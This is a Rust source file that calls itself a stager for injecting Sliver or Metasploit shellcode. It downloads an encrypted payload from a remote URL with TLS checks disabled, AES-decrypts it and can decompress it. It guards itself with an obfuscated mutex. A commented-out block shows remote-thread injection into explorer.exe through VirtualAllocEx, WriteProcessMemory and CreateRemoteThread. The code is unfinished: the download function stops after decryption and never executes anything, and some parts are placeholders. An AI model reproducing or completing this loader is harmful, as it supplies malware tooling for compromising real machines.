// Implement a stager for Shellcode Injection of Sliver or Metasploit Shellcode
extern crate kernel32;
use aes::{Aes128, Aes256, NewBlockCipher};
use block_modes::{BlockMode, Cbc};
use block_modes::block_padding::NoPadding;
use bytes::Bytes;
use clap::Parser;
use flate2::read::{DeflateDecoder, GzDecoder};
use named_lock::{NamedLock, Result};
use region::{Protection, Allocation};
use std::{ptr, process::exit, error::Error, io::self, io::Read};
use sysinfo::{PidExt, ProcessExt, System, SystemExt};
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS};

const LOCKNAME: &str = "RLOCK";

#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
    #[arg(short, long)]
    url: String,

    #[arg(short, long)]
    binary: String,

    #[arg(short, long, required = false)]
    compression: Vec<String>,

    #[arg(short = 'k', long)]
    aes_key: String,

    #[arg(short = 'i', long)]
    aes_iv: String,
}

fn download_and_execute(url: String, binary:String, compression: String, aes_key: String, aes_iv: String) {
    // Download Shellcode from stage-listener
    let downloaded = download_shellcode_from_url(url);
    println!("Downloaded Shellcode: {} bytes", downloaded.len());
    // Decrypt Shellcode
    let decrypted = decrypt(&downloaded, aes_key.as_bytes(), aes_iv.as_bytes());
    // Decompress Shellcode
}

fn decompress(data: &[u8], compression_algorithm: &str) -> Result<Vec<u8>, Box<dyn Error>> {
    let mut decompressed_data = Vec::new();

    match compression_algorithm {
        "deflate9" => {
            let mut decompressor = DeflateDecoder::new(data);
            decompressor.read_to_end(&mut decompressed_data)?;
        }
        "gzip" => {
            let mut decompressor = GzDecoder::new(data);
            decompressor.read_to_end(&mut decompressed_data)?;
        }
        _ => {
            // If compression algorithm is not recognized, return the original data
            decompressed_data.extend_from_slice(data);
        }
    }

    Ok(decompressed_data)
}

fn decrypt(ciphertext: &[u8], aes_key: &[u8], aes_iv: &[u8]) -> Result<Vec<u8>, &'static str> {
    // Choose the AES type based on the key length (128 or 256 bits)
    let cipher = Cbc::<Aes256, NoPadding>::new_from_slices(aes_key, aes_iv);

    // Check if the cipher was created successfully
    let cipher = match cipher {
        Ok(c) => c,
        Err(_) => return Err("Failed to create cipher"),
    };

    // Initialize the CBC mode with NoPadding
    let mut buffer = ciphertext.to_vec();
    
    let decrypted = cipher.decrypt(&mut buffer)
        .map_err(|_| "Decryption failed")?;

    // Return the decrypted data as a Vec<u8>
    Ok(decrypted.to_vec())
}

fn download_shellcode_from_url(url: String) -> Bytes {
    let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .danger_accept_invalid_hostnames(true)
        .build()
        .unwrap();

    let res = match client.get(url).send() {
        Ok(res) => res,
        Err(_) => panic!("")
    };
 
    let rbytes = match res.bytes() {
        Ok(b) => b,
        Err(_) => panic!("")
    };
    
    return rbytes;
}

// fn find_process_by_name(process_name: &str) -> u32 {
//     let sys = System::new_all();
//     let pid = sys
//         .processes_by_exact_name(process_name)
//         .next()
//         .expect("Error finding process")
//         .pid();
//     pid.as_u32()
// }

fn main() {
    // Parse args and sign values to variables
    let args = Args::parse();

    // let process_name = "explorer.exe";
    // let pid = find_process_by_name(process_name);
    // println!("Found process: {} with PID: {}", process_name, pid);

    // unsafe {
    //     let handler = kernel32::OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
    //     let address = kernel32::VirtualAllocEx(
    //         handler,
    //         ptr::null_mut(),
    //         shellcode.len() as u64,
    //         MEM_COMMIT | MEM_RESERVE,
    //         PAGE_EXECUTE_READWRITE,
    //     );
    //     let mut bytes_written = 0;
    //     kernel32::WriteProcessMemory(
    //         handler,
    //         address,
    //         shellcode.as_ptr() as *mut _,
    //         shellcode.len() as u64,
    //         &mut bytes_written,
    //     );
    //     kernel32::CreateRemoteThread(
    //         handler,
    //         ptr::null_mut(),
    //         0,
    //         Some(std::mem::transmute(address)),
    //         ptr::null_mut(),
    //         0,
    //         ptr::null_mut(),
    //     );
    //     kernel32::CloseHandle(handler);
    // }
    let lock = match NamedLock::create(obfstr::obfstr!(LOCKNAME)) {
        Ok(lock) => lock,
        Err(_) => exit(0)
    };
    let _guard = match lock.lock() {
        Ok(g) => g,
        Err(_) => exit(0)
    };
    let _ = download_and_execute(args.url, args.binary, "Hello".to_string(), args.aes_key, args.aes_iv);
}
